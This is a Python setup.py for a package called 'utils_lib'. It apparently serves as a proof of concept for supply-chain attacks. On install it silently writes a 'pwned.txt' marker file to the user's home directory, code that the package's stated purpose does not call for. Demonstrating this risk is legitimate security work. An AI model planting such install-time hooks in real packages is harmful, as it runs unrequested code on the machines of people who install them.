from setuptools import setup
from pathlib import Path

Path.home().joinpath("pwned.txt").write_text(
    "Infiltrated by utils_lib",
    encoding="utf-8"
)

setup(
    name="utils_lib",
    version="1.0.0",
    py_modules=["utils_lib"],
)
